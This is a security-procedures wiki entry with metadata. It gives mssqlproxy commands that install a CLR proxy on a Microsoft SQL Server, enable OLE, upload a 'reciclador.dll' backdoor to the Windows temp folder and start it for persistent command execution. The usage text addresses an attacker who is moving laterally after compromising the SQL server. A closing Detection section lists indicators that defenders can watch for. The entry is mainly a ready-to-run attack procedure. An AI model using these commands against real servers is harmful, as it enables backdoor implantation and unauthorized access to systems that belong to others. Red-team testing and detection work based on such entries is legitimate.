---
id: acc9cca6-273b-400e-ada8-5a877e17f82a
name: mssqlproxy-install-and-inject-reciclador-dll
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:20.471683+00:00'
updated_at: '2023-04-10T20:36:31.777516+00:00'
platforms:
  - Windows
tags:
  - dll-injection
  - proxy
validated: true
---

# mssqlproxy-install-and-inject-reciclador-dll

## Code

```python
# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```

## Description

This script uses mssqlclient.py to install a CLR proxy on MSSQL, check and start the reciclador.dll backdoor, enable OLE, and upload the DLL for injection. It facilitates persistent command execution via a custom proxy.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| host | SQL Server host | localhost |
| username | SQL username | sa |
| password | SQL password | Password123 |
| 10.10.10.10 | Target IP | 192.168.1.100 |
| C:\windows\temp\reciclador.dll | DLL upload path | C:\temp\reciclador.dll |

## Usage

Run the Python commands sequentially from an attacker machine with network access to the target MSSQL. Download mssqlclient.py and reciclador.dll first. Then enter the SQL> prompt for uploads. Ideal for lateral movement after initial SQL compromise.

## Detection

- Network traffic to non-standard ports from sqlservr.exe.
- CLR assembly loads of unknown DLLs like Proxy.dll or reciclador.dll.
- File creation in temp directories monitored by AV/EDR.
- SQL logs showing unusual uploads or OLE enables.

## Related

- [[procedures/MSSQL-OLE-Automation-Command-Execution]]
- [[tools/mssqlproxy]]
